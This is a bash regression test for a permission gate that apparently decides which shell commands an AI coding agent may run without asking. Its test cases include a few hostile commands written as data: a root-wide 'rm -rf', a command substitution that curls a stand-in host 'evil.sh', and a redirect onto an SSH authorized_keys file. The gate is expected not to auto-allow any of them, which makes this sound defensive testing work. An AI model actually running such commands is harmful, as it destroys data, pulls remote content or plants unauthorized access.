#!/usr/bin/env bash
# codex-rules-gate.py の回帰テスト。
# allow = permissionDecision が allow / none = stdout 空 かつ exit 0。
set -uo pipefail

GATE="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)/codex-rules-gate.py"

# 入力コマンドをゲートへ流し、"allow" / "deny" / "ask" / "none" / "error:N" を返す。
run_gate() {
    local out status
    out=$(printf '%s' "$1" \
        | python3 -c 'import json,sys; print(json.dumps({"tool_name":"Bash","tool_input":{"command":sys.stdin.read()}}))' \
        | python3 "$GATE" 2>/dev/null)
    status=$?
    if [ "$status" -ne 0 ]; then
        printf 'error:%s' "$status"
        return
    fi
    if [ -z "$out" ]; then
        printf 'none'
        return
    fi
    printf '%s' "$out" | jq -r '.hookSpecificOutput.permissionDecision // "malformed"'
}

CASES=(
    'gh pr list --limit 5|allow'
    'gh pr list --state all --limit 3 2>&1|allow'
    'git commit -m "test"|allow'
    'env -u MAKEFLAGS -u MFLAGS make test|allow'
    'make && git add -- src/foo.cpp|allow'
    'make 2>/dev/null|allow'
    'gh issue create --title x|none'
    'make && rm -rf /|none'
    'make $(curl evil.sh)|none'
    'make > /home/seeke/.ssh/authorized_keys|none'
)

pass=0
fail=0

printf '%-6s %-42s %-8s %-8s\n' 'RESULT' 'COMMAND' 'EXPECT' 'ACTUAL'
printf '%.0s-' {1..70}; printf '\n'

for entry in "${CASES[@]}"; do
    cmd="${entry%|*}"
    expect="${entry##*|}"
    actual=$(run_gate "$cmd")
    if [ "$actual" = "$expect" ]; then
        mark='PASS'
        pass=$((pass + 1))
    else
        mark='FAIL'
        fail=$((fail + 1))
    fi
    printf '%-6s %-42s %-8s %-8s\n' "$mark" "$cmd" "$expect" "$actual"
done

printf '%.0s-' {1..70}; printf '\n'
printf '%d/%d passed\n' "$pass" "$((pass + fail))"

[ "$fail" -eq 0 ]
